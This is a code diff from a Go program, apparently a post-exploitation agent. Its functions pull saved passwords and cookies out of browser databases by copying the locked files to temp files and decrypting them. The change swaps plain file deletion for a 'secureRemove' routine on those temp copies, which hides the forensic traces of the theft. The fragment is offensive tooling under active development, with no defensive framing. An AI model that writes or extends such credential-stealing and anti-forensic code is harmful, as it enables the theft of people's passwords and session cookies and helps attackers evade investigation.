@@ -315,7 +315,7 @@ func browserPasswords(args browserArgs) structs.CommandResult {
 				tf.Close()
 				if copyErr := copyFile(loginDataPath, tmpFile); copyErr == nil {
 					creds, readErr := readLoginData(tmpFile, key, browserName, profileName)
-					os.Remove(tmpFile)
+					secureRemove(tmpFile)
 					if readErr == nil {
 						allCreds = append(allCreds, creds...)
 						continue
@@ -323,7 +323,7 @@ func browserPasswords(args browserArgs) structs.CommandResult {
 					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
 					continue
 				}
-				os.Remove(tmpFile)
+				secureRemove(tmpFile)
 			}
 
 			// Strategy 2: Open locked DB directly in immutable mode
@@ -528,7 +528,7 @@ func browserCookies(args browserArgs) structs.CommandResult {
 				tf.Close()
 				if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
 					cookies, readErr := readCookieData(tmpFile, key, browserName, profileName)
-					os.Remove(tmpFile)
+					secureRemove(tmpFile)
 					if readErr == nil {
 						allCookies = append(allCookies, cookies...)
 						continue
@@ -536,7 +536,7 @@ func browserCookies(args browserArgs) structs.CommandResult {
 					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
 					continue
 				}
-				os.Remove(tmpFile)
+				secureRemove(tmpFile)
 			}
 
 			// Strategy 2: Open locked DB directly in immutable mode (no locking)
@@ -657,12 +657,12 @@ func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
 			if err == nil {
 				cleanup := func() {
 					db.Close()
-					os.Remove(tmpFile)
+					secureRemove(tmpFile)
 				}
 				return db, cleanup, nil
 			}
 		}
-		os.Remove(tmpFile)
+		secureRemove(tmpFile)
 	}
 
 	// Strategy 2: Open in immutable mode
